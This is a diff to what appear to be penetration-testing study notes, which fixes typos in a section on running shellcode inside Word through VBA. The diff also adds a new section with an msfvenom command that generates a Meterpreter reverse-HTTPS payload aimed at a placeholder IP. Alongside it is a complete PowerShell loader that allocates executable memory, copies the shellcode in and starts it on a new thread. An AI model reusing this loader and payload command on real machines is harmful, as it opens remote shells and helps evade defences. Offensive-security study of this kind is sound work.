@@ -962,7 +962,7 @@ Sub MyMacro()
 End Sub
 ```
 
-## Executing Shellcode in Word Memory
+## Executing Shellcode in Word Memory using VBA
 To execute shellcode in memory we will take use of the three Win32 API's
 
 ### VirtualAlloc
@@ -1010,7 +1010,7 @@ VOID RtlMoveMemory(
 |return value [LongPtr]| memory pointer|
 
 ### CreateThread
-After copying the shelcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
+After copying the shellcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
 
 ```
 HANDLE CreateThread(
@@ -1081,16 +1081,44 @@ To work as expected, this requires a matching 32-bit multi/handler in Metasploit
 
 
 
+## Executing Shellcode in Word Memory using Powershell
+Generating Shellcode
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 EXITFUNC=thread -f ps1
+```
 
+```powershell
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
 
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
+        UInt32 dwMilliseconds);
+}
+"@
 
+Add-Type $Kernel32
 
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...
 
+$size = $buf.Length
 
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
 
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 
-
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+We use WaitForSingleObject to instruct powershell to wait forever or until we exit our shell (0xFFFFFFFF).
+Otherwise our shell dies as soon as the parent powershell process terminates. The shell is basically terminatedb before it even starts.
 
 # Port Redirection and Tunneling
 ## Plink
